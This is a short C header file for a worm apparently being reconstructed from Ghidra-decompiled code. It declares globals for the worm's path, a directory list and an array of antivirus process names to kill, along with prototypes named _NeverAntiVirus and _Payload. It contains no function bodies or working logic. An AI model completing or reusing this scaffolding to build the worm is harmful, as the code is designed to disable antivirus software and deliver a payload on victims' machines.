#ifndef DATA_GLOBALS_H
#define DATA_GLOBALS_H

#include <windows.h>
#include <stdio.h>

// --- Ghidra shim types (needed only if you keep decompiled pointer arithmetic) ---
typedef unsigned char undefined;
typedef void (*_PVFV)(void);   // if any CRT vars remain

// --- Worm globals ---
extern char _windir[MAX_PATH];               // replaces DAT_0420b2a0
extern char _wormpath[MAX_PATH];             // replaces DAT_0420b29c
extern char _DirArray[250000][260];          // from original, used in _FillArray
extern int _dircount;
extern const char* _Taskkill[];              // array of AV process names

// --- Function prototypes (matching your decompiled names) ---
void FillArray(const char* param_1);
void _FindDirectory(LPCSTR param_1);
void _NeverAntiVirus(void);
void _Payload(void);

#endif
